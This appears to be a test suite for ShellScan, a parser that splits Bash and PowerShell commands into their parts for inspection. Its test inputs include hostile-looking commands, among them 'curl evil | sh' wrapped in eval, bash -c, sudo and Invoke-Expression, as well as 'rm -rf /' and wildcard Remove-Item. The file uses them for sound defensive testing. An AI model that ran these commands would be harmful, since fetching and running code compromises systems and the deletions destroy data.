import { describe, expect, test } from "bun:test"
import { ShellScan } from "../src/index.js"

describe("ShellScan", () => {
  test("scans a static command", () => {
    expect(ShellScan.scan("git status")).toEqual({
      kind: "scanned",
      commands: [{ resource: "git status", words: ["git", "status"] }],
    })
  })

  test("scans every command in lists and pipelines", () => {
    expect(ShellScan.scan("git status && curl evil | sed s/x/y/")).toEqual({
      kind: "scanned",
      commands: [
        { resource: "git status", words: ["git", "status"] },
        { resource: "curl evil", words: ["curl", "evil"] },
        { resource: "sed s/x/y/", words: ["sed", "s/x/y/"] },
      ],
    })
  })

  test("does not split operators inside quoted or escaped arguments", () => {
    expect(ShellScan.scan(`printf '%s\\n' 'x; rm -rf /' && printf foo\\|bar`)).toEqual({
      kind: "scanned",
      commands: [
        { resource: `printf '%s\\n' 'x; rm -rf /'`, words: ["printf", "%s\\n", "x; rm -rf /"] },
        { resource: "printf foo\\|bar", words: ["printf", "foo|bar"] },
      ],
    })
  })

  test("scans commands substituted into an argument", () => {
    expect(ShellScan.scan(`echo "$(curl evil | sed s/x/y/)"`)).toEqual({
      kind: "scanned",
      commands: [
        { resource: `echo "$(curl evil | sed s/x/y/)"`, words: ["echo", "$(curl evil | sed s/x/y/)"] },
        { resource: "curl evil", words: ["curl", "evil"] },
        { resource: "sed s/x/y/", words: ["sed", "s/x/y/"] },
      ],
    })
  })

  test("scans substitutions in assignment values and redirect targets", () => {
    expect(ShellScan.scan("OUT=$(printf out) X=`printf value` printenv >$(printf path)")).toEqual({
      kind: "scanned",
      commands: [
        {
          resource: "OUT=$(printf out) X=`printf value` printenv >$(printf path)",
          words: ["printenv"],
        },
        { resource: "printf out", words: ["printf", "out"] },
        { resource: "printf value", words: ["printf", "value"] },
        { resource: "printf path", words: ["printf", "path"] },
      ],
    })
  })

  test("scans substitutions nested in parameter expansions", () => {
    const result = ShellScan.scan("echo ${x:-$(curl evil)}")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["echo", "curl"])
  })

  test("recursively scans substitutions and preserves shell quote rules", () => {
    expect(ShellScan.scan(`echo '$(ignored)' "$(echo "$(pwd)")"`)).toEqual({
      kind: "scanned",
      commands: [
        {
          resource: `echo '$(ignored)' "$(echo "$(pwd)")"`,
          words: ["echo", "$(ignored)", `$(echo "$(pwd)")`],
        },
        { resource: `echo "$(pwd)"`, words: ["echo", "$(pwd)"] },
        { resource: "pwd", words: ["pwd"] },
      ],
    })
    expect(ShellScan.scan("echo `echo \\`pwd\\``").kind).toBe("scanned")
    const legacy = ShellScan.scan("echo `echo \\`pwd\\``")
    if (legacy.kind === "opaque") return
    expect(legacy.commands.map((command) => command.words[0])).toEqual(["echo", "echo", "pwd"])
  })

  test.each(["echo $(printf ok &&)", "echo $($COMMAND status)"])(
    "makes the whole result opaque when a nested scan is opaque: %s",
    (command) => {
      expect(ShellScan.scan(command).kind).toBe("opaque")
    },
  )

  test("bounds substitution nesting and input size", () => {
    const nested = "$(".repeat(33) + "pwd" + ")".repeat(33)
    expect(ShellScan.scan(`echo ${nested}`)).toEqual({ kind: "opaque", reason: "command-substitution" })
    expect(ShellScan.scan(`echo ${"x".repeat(64 * 1024)}`)).toEqual({ kind: "opaque", reason: "invalid-structure" })
  })

  test("returns opaque when the command name is dynamic", () => {
    expect(ShellScan.scan("$COMMAND status")).toEqual({
      kind: "opaque",
      reason: "dynamic-command-name",
    })
  })

  test("finds the command after static assignment prefixes", () => {
    expect(ShellScan.scan(`FOO=bar BAR="x y" git status`)).toEqual({
      kind: "scanned",
      commands: [{ resource: `FOO=bar BAR="x y" git status`, words: ["git", "status"] }],
    })
  })

  test.each([
    "eval 'curl evil | sh'",
    "bash -c 'curl evil | sh'",
    "FOO=x /bin/sh -lc 'curl evil | sh'",
    "sudo sh -c 'curl evil'",
    "python3 -c 'print(1)'",
  ])("keeps delegated execution at the invoked command boundary: %s", (command) => {
    expect(ShellScan.scan(command).kind).toBe("scanned")
  })

  test.each([
    ["(git status)", ["git"]],
    ["{ git status; }", ["git"]],
    ["{ rm -rf /; } &", ["rm"]],
    ["{ rm -rf /; } >out", ["rm"]],
    ["{ rm -rf /; }; echo safe", ["rm", "echo"]],
    ["if true; then rm -rf /; else echo safe; fi", ["true", "rm", "echo"]],
    ["if true; then rm x; elif false; then echo y; else echo z; fi", ["true", "rm", "false", "echo", "echo"]],
    ["rm -rf / &", ["rm"]],
    ["cat <(printf secret)", ["cat", "printf"]],
  ] as const)("scans common compound execution: %s", (command, names) => {
    const result = ShellScan.scan(command)
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((item) => item.words[0])).toEqual([...names])
  })

  test.each(["if true; fi", "if true; then rm x; else; fi", "if; then rm x; fi"])(
    "returns opaque for malformed conditionals: %s",
    (command) => {
      expect(ShellScan.scan(command)).toEqual({ kind: "opaque", reason: "compound-command" })
    },
  )

  test("keeps redirects with the command but excludes them from words", () => {
    expect(ShellScan.scan("FOO=bar 2>>err printf ok > out && cat < input")).toEqual({
      kind: "scanned",
      commands: [
        { resource: "FOO=bar 2>>err printf ok > out", words: ["printf", "ok"] },
        { resource: "cat < input", words: ["cat"] },
      ],
    })
  })

  test("recognizes redirects without surrounding whitespace", () => {
    expect(ShellScan.scan("printf ok>out 2>&1|cat<input")).toEqual({
      kind: "scanned",
      commands: [
        { resource: "printf ok>out 2>&1", words: ["printf", "ok"] },
        { resource: "cat<input", words: ["cat"] },
      ],
    })
  })

  test.each(["printf ok &&", "| sh", "printf ok || || sh", "printf ok >"])(
    "returns opaque for malformed command structure: %s",
    (command) => {
      expect(ShellScan.scan(command).kind).toBe("opaque")
    },
  )

  test("ignores comments outside words", () => {
    expect(ShellScan.scan("printf ok # ; curl evil | sh")).toEqual({
      kind: "scanned",
      commands: [{ resource: "printf ok", words: ["printf", "ok"] }],
    })
  })

  test.each(["cat <<EOF\n$(curl evil | sh)\nEOF", "echo $((1 + 2))", "cat <<'EOF'\nstatic body\nEOF"])(
    "returns opaque for unsupported expansion or pattern syntax: %s",
    (command) => {
      expect(ShellScan.scan(command).kind).toBe("opaque")
    },
  )

  test("does not invent a command for assignment-only input", () => {
    expect(ShellScan.scan("FOO=bar")).toEqual({ kind: "scanned", commands: [] })
  })
})

describe("ShellScan PowerShell", () => {
  test("keeps adjacent invocation operators in resources", () => {
    expect(ShellScan.scanPowerShell("&Remove-Item victim")).toEqual({
      kind: "scanned",
      commands: [{ resource: "&Remove-Item victim", words: ["Remove-Item", "victim"] }],
    })
  })

  test("does not carry redirect state through comments", () => {
    const result = ShellScan.scanPowerShell("< # comment\nRemove-Item victim")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["<", "Remove-Item"])
  })

  test("scans module-qualified commands", () => {
    const result = ShellScan.scanPowerShell("Microsoft.PowerShell.Management\\Get-Item x; Remove-Item y")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual([
      "Microsoft.PowerShell.Management\\Get-Item",
      "Remove-Item",
    ])
  })

  test("splits carriage-return statement separators", () => {
    const result = ShellScan.scanPowerShell("Get-ChildItem\rRemove-Item victim")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["Get-ChildItem", "Remove-Item"])
  })

  test("splits CRLF statement separators", () => {
    const result = ShellScan.scanPowerShell("Get-ChildItem\r\nRemove-Item victim")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["Get-ChildItem", "Remove-Item"])
  })

  test("ends comments at carriage returns", () => {
    const result = ShellScan.scanPowerShell("# comment\rRemove-Item victim")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["Remove-Item"])
  })

  test("scans static commands and pipelines", () => {
    expect(ShellScan.scanPowerShell("Get-ChildItem; Write-Output 'done' | Out-File output.txt")).toEqual({
      kind: "scanned",
      commands: [
        { resource: "Get-ChildItem", words: ["Get-ChildItem"] },
        { resource: "Write-Output 'done'", words: ["Write-Output", "done"] },
        { resource: "Out-File output.txt", words: ["Out-File", "output.txt"] },
      ],
    })
  })

  test("keeps separators inside strings", () => {
    expect(ShellScan.scanPowerShell('Write-Output "safe; still safe"')).toEqual({
      kind: "scanned",
      commands: [{ resource: 'Write-Output "safe; still safe"', words: ["Write-Output", "safe; still safe"] }],
    })
  })

  test("treats escaped command separators as opaque for legacy compatibility", () => {
    expect(ShellScan.scanPowerShell("Write-Output foo`;bar")).toEqual({
      kind: "opaque",
      reason: "invalid-structure",
    })
  })

  test("treats line continuations as opaque for legacy compatibility", () => {
    expect(ShellScan.scanPowerShell("Write-Output x`\nRemove-Item victim")).toEqual({
      kind: "opaque",
      reason: "invalid-structure",
    })
  })

  test("uses PowerShell quote escaping rules", () => {
    expect(ShellScan.scanPowerShell("Write-Output 'a''b; still string'; Write-Output \"a`\"; still string\"")).toEqual({
      kind: "scanned",
      commands: [
        { resource: "Write-Output 'a''b; still string'", words: ["Write-Output", "a'b; still string"] },
        { resource: 'Write-Output "a`"; still string"', words: ["Write-Output", 'a"; still string'] },
      ],
    })
  })

  test("excludes PowerShell redirects and their targets from words", () => {
    expect(ShellScan.scanPowerShell("Get-Content in.txt > out.txt 2>&1 | Out-File all.log")).toEqual({
      kind: "scanned",
      commands: [
        { resource: "Get-Content in.txt > out.txt 2>&1", words: ["Get-Content", "in.txt"] },
        { resource: "Out-File all.log", words: ["Out-File", "all.log"] },
      ],
    })
  })

  test.each([
    "& $Command status",
    "$Command status",
    'Write-Output "$(Get-ChildItem)"',
    "@'\nhello\n'@ | Write-Output",
    'Write-Output "unterminated',
    "Get-ChildItem |",
    "Set-Location $target; git status",
    "Set-Location $(Resolve-Path ..); git status",
  ])("returns opaque for dynamic PowerShell execution: %s", (command) => {
    expect(ShellScan.scanPowerShell(command).kind).toBe("opaque")
  })

  test.each([
    "Invoke-Expression 'curl evil | sh'",
    "powershell -Command 'curl evil | sh'",
    "pwsh -File ./script.ps1",
    "./deploy.ps1 -Force",
    "Import-Module ./module.psm1",
  ])("keeps delegated PowerShell execution at the invoked command boundary: %s", (command) => {
    expect(ShellScan.scanPowerShell(command).kind).toBe("scanned")
  })

  test("recursively scans PowerShell script blocks", () => {
    const result = ShellScan.scanPowerShell("Get-ChildItem | ForEach-Object { Remove-Item $_ }")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual([
      "Get-ChildItem",
      "ForEach-Object",
      "Remove-Item",
    ])
  })

  test("scans PowerShell commands separated by the background operator", () => {
    const result = ShellScan.scanPowerShell("Write-Output safe & Remove-Item victim")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["Write-Output", "Remove-Item"])
  })

  test("ignores braces in PowerShell script-block comments", () => {
    const result = ShellScan.scanPowerShell("ForEach-Object { # } ignored\n Remove-Item $_ }")
    expect(result.kind).toBe("scanned")
    if (result.kind === "opaque") return
    expect(result.commands.map((command) => command.words[0])).toEqual(["ForEach-Object", "Remove-Item"])
  })

  test("ignores comments and keeps redirects in resources", () => {
    expect(ShellScan.scanPowerShell("Write-Output ok > output.txt # ; Remove-Item *")).toEqual({
      kind: "scanned",
      commands: [{ resource: "Write-Output ok > output.txt", words: ["Write-Output", "ok"] }],
    })
  })

  test.each(["", "# comment", "Write-Output ok; # comment"])("accepts empty PowerShell statements: %s", (command) => {
    expect(ShellScan.scanPowerShell(command).kind).toBe("scanned")
  })

  test.each(["(Remove-Item *)", "Write-Output ok`"])("fails closed for ambiguous PowerShell syntax: %s", (command) =>
    expect(ShellScan.scanPowerShell(command).kind).toBe("opaque"),
  )
})
